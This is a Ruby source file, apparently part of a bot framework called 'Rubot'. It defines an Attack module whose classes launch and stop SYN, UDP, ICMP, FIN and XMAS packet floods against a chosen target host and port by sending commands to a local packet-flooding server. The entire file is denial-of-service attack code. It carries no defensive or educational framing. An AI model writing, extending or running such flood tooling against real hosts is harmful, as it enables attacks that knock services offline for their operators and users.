module Rubot
  module Attack
    class Packeting
      def packet_server(host, port)
        @packet_server = [host, port]
      end
      
			def launch
        url = "http://#{@packet_server.join(":")}/pkt/#{@target}/#{@port}/#{@type}/#{@rate}/#{@duration}"
        http = EventMachine::HttpRequest.new(url).get
        http.callback {
          @task_id = http.response
        }
			end
      
      def stop
        if @task_id
          http = EventMachine::HttpRequest.new("http://#{@packet_server.join(":")}/stop/#{@task_id}").get
          http.callback {
            @task_id = nil
          }
        end
      end          
    end
    
		class SYNFlood < Packeting
			def initialize(target, port, rate=1, duration=60)
				@rate = rate
				@target = target
				@port = port
				@duration = duration
        @packet_server = ['127.0.0.1', 7777]
        @task_id = nil
        @type = 'syn'
			end
		end

		class UDPFlood < SYNFlood
      def initialize(target, port, rate=1, duration=60)
        super(target, port, rate, duration)
        @type = 'udp'
      end
		end

		class ICMPFlood < Packeting
			def initialize(target, ftype, code, rate=1, duration=60)
				@rate = rate
				@target = target
				@port = "#{ftype}.#{code}"
				@duration = duration
        @packet_server = ['127.0.0.1', 7777]
        @task_id = nil
        @type = 'icmp'
			end
    end
    
    class FINFlood < SYNFlood
      def initialize(target, port, rate=1, duration=60)
        super(target, port, rate, duration)
        @type = 'fin'
      end
    end
    
    class XMASFlood < SYNFlood
      def initialize(target, port, rate=1, duration=60)
        super(target, port, rate, duration)
        @type = 'xmas'
      end
    end
    
    class YMASFlood < SYNFlood
      def initialize(target, port, rate=1, duration=60)
        super(target, port, rate, duration)
        @type = 'ymas'
      end
    end
	end
end